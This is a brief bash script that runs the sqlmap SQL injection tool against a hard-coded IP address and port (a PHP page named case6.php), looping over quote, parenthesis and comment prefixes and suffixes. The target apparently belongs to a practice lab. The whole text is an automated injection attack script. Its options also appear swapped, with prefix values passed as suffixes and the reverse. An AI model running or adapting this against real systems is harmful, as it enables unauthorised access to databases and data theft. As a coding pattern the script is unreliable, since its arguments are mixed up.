#!/bin/bash
prefixes=("'" "')" "\\" ")")
suffixes=("--" "#" "/* */" "'")


for p in "${prefixes[@]}"; do
  for s in "${suffixes[@]}"; do
    echo "Running with: prefix=$p suffix=$s"
    sqlmap -u " http://154.57.164.83:30314/case6.php?col=id"  --suffix $p --prefix $s
  done
done
